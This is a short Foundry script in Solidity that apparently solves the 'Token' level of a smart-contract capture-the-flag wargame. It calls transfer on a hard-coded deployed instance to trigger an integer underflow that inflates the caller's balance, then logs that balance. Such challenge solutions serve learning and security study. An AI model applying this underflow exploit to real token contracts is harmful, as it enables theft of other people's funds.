// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/05-Token.sol";

contract TokenSolution is Script {
    Token public tokenInstance = Token(0xDC11B390E74680856B74e1052F797b74A7D5816D);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenInstance.transfer(
            address(0),
            21
        );
        console.log("my balance:", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }

}